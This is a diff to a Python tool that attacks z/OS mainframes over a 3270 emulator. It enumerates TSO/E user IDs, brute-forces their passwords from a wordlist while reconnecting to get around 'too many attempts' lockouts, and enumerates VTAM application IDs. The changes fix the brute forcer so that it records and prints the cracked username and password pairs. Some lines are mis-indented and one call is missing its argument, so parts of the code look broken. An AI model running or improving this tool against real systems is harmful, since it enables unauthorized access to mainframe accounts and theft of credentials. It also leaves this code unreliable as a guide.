@@ -111,8 +111,16 @@ def enter_TSOPanel(em):
 	em.send_enter() 
 
 	if not em.find_response( 'TSO/E LOGON'):
-		whine('Not at TSO/E Logon screen. Aborting.',kind='err')
-		return False
+		#hiccups occurred here, just retry
+		em.send_string('TSO')
+		em.send_enter()
+		time.sleep(2)
+		em.exec_command('Wait(InputField)')
+		em.send_string('TSOFAKE')
+		em.send_enter()
+		if not em.find_response( 'TSO/E LOGON'):
+			whine('Not at TSO/E Logon screen. Aborting.',kind='err')
+			return False
 	whine('At TSO/E Logon Panel',kind='info',level=1)
 	return True
 
@@ -125,14 +133,15 @@ def connect_zOS(em, target):
 		sys.exit(1)
 
 def validate_text(name,size=7,kind='Username'):
+        name=name.strip()
 	if name[0].isdigit(): #starts with number
-		whine(kind+':', name.strip() ,' '+kind+'s cannot start with a number, skipping',kind='warn',level=1)
+		whine(kind+':'+ name.strip() +' '+kind+'s cannot start with a number, skipping',kind='warn',level=1)
 		return False
 	elif not re.match("^[a-zA-Z0-9#@$]+$", name): #disallowed chars
-		whine(kind+':', name.strip() ,' '+kind+' contains an invalid character (Only A-z, 0-9, #, $ and @), skipping',kind='warn',level=1)
+		whine(kind+':'+ name.strip() + ' '+kind+' contains an invalid character (Only A-z, 0-9, #, $ and @), skipping',kind='warn',level=1)
 		return False
 	elif len(name.strip()) > size: #too long
-		whine(kind+':', name.strip() ,'User name too long ( >7 )',kind='warn',level=1)
+		whine(kind+':'+  name.strip() + 'User name too long ( >7 )',kind='warn',level=1)
 		return False
 	return True #valid
 
@@ -156,7 +165,9 @@ def brute_TSO(em,results,userfile,passfile=''):
 			em.reconnect()
 			enter_TSOPanel()
 			em.safe_fieldfill(06, 20, username.strip(), 7)
+		        em.move_to(1,1)
 			em.send_enter()
+		        print em.screen_get()
 
 		# Look for output showing the user exists
 		if em.find_response( 'Enter current password for'):
@@ -167,17 +178,17 @@ def brute_TSO(em,results,userfile,passfile=''):
 
 		# We found a username
 		if gooduser:
-			whine('Username:', username.strip() ,' TSO User Found!',kind='good',level=1)
-			valid_users.append((username.strip(),''))
+			whine('Username:' + username.strip() + ' TSO User Found!',kind='good',level=1)
+			valid_users.append([username.strip(),''])
 		else:
 			whine('Username: ' + username.strip() + ' Not a TSO User',kind='warn',level=1)
 
 		# Password brute force
-		validpass = True
 		if gooduser and not results.enumeration:
 			whine('Starting Password brute forcer',kind='info',level=1)
 			passfile=open(results.passfile) #open the passwords file
 			for password in passfile:
+                                validpass = True
 				if not validate_text(password,8,kind='Password'):
 					continue
 
@@ -186,7 +197,7 @@ def brute_TSO(em,results,userfile,passfile=''):
 				em.send_enter()
 
 				# We've tried too many attempts and need to reconnect
-				if em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
+				if (not em.is_connected()) or em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
 					em.reconnect()
 					enter_TSOPanel(em)
 					em.safe_fieldfill(06, 20, username.strip(), 7)
@@ -203,7 +214,7 @@ def brute_TSO(em,results,userfile,passfile=''):
 				# Good user and good pass
 				if validpass:
 					whine(password.strip() + ' Password Found!!',kind='good',level=2)
-					valid_users[len(valid_users)-1][1] = username.strip()	
+					valid_users[len(valid_users)-1][1] = password.strip()	
 					em.reconnect()
 					enter_TSOPanel(em)
 					break #Skip to next userid
@@ -219,7 +230,7 @@ def brute_TSO(em,results,userfile,passfile=''):
 
 	whine('Found ' + str(len(valid_users)) + ' valid user accounts:',kind="good",level=0)
 	for enum_user in valid_users:
-		whine('Valid User ID -> ' + enum_user,level=1)
+		whine('Valid User ID -> ' + enum_user[0] + ":" + enum_user[1],level=1)
 
 def brute_APPLID(em,results,appfile):
 	whine('Starting APPLID Enumeration',kind='info',level=1)
@@ -397,7 +408,7 @@ if results.vtam:
 	appfile=open(results.appfile) #open the appids file
 elif results.tso:
 	whine('TSO/E Bruting\t\t: Enabled',kind='info')
-	whine('You should probably use https://github.com/mainframed/psikotik/ instead.',kind=info)
+	whine('You should probably use https://github.com/mainframed/psikotik/ instead.',kind='info')
 	whine('Username File\t\t: ' + str(results.userfile),kind='info')
 	userfile=open(results.userfile) #open the usernames file
 	if not results.enumeration:
